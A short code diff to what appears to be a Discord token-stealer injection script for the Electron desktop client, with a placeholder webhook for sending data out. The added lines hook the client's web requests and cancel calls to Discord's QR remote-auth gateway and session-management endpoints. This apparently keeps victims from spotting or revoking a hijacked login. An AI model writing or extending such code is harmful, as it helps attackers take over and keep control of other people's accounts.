@@ -8,6 +8,17 @@ const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
     path = require("path");
 
 let WEBHOOK = "%WEBHOOK_URL%";
+const CONFIG = {
+    filters2: {
+        urls: [
+            'wss://remote-auth-gateway.discord.gg/*',
+            'https://discord.com/api/v*/auth/sessions',
+            'https://*.discord.com/api/v*/auth/sessions',
+            'https://discordapp.com/api/v*/auth/sessions'
+        ],
+    },
+};
+
 
 let [
     BACKUPCODES_SCRIPT,
@@ -601,6 +612,12 @@ const CREATE_WINDOW_CLIENT = (win) => {
         "closed", () => CREATE_WINDOW_CLIENT(BrowserWindow)
     );
 };
+
+session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
+    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
+        cancel: true
+    })
+});
 
 CREATE_WINDOW_CLIENT(BrowserWindow); // INIT
 
